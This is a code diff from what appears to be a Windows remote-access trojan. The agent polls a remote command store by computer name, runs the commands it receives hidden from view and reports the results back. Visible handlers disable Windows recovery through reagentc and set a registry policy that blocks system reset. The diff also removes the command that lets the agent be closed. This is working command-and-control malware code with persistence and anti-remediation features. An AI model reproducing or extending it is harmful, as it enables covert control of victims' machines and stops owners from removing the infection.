@@ -23,7 +23,6 @@ using namespace Gdiplus;
 std::string computerName;
 std::string publicIP;
 bool g_noPing=false;
-volatile bool g_exit=false;
 int g_liveQuality=25;
 float g_liveScale=0.5f;
 int g_liveMonitor=0;
@@ -1607,13 +1606,11 @@ DWORD WINAPI pollThread(LPVOID) {
                     else if (type == "reset_on") { WinExec("reagentc /disable 2>nul",SW_HIDE); HKEY k; if(RegCreateKeyExA(HKEY_LOCAL_MACHINE,"SOFTWARE\\Policies\\Microsoft\\Windows\\System",0,NULL,0,KEY_SET_VALUE,NULL,&k,NULL)==ERROR_SUCCESS){DWORD v=1;RegSetValueExA(k,"DisableReset",0,REG_DWORD,(BYTE*)&v,sizeof(v));RegCloseKey(k);} result="ok"; }
                     else if (type == "reset_off") { WinExec("reagentc /enable 2>nul",SW_HIDE); HKEY k; if(RegCreateKeyExA(HKEY_LOCAL_MACHINE,"SOFTWARE\\Policies\\Microsoft\\Windows\\System",0,NULL,0,KEY_SET_VALUE,NULL,&k,NULL)==ERROR_SUCCESS){RegDeleteValueA(k,"DisableReset");RegCloseKey(k);} result="ok"; }
                     else if (type == "uninstall") result = uninstallSelf();
-                    else if (type == "close") { g_exit = true; result = "closing"; }
                     else result = "unknown_type";
                 } catch(...) { result = "exec_err"; }
                 std::string escaped = jsonEscape(result);
                 std::string resBody = "{\"status\":\"done\",\"result\":\"" + escaped + "\"}";
                 httpsPatch("/commands/" + fbEsc(computerName) + "/" + key + ".json", resBody);
-                if(g_exit)exit(0);
                 pos = objEnd;
             }
         } catch(...) {}
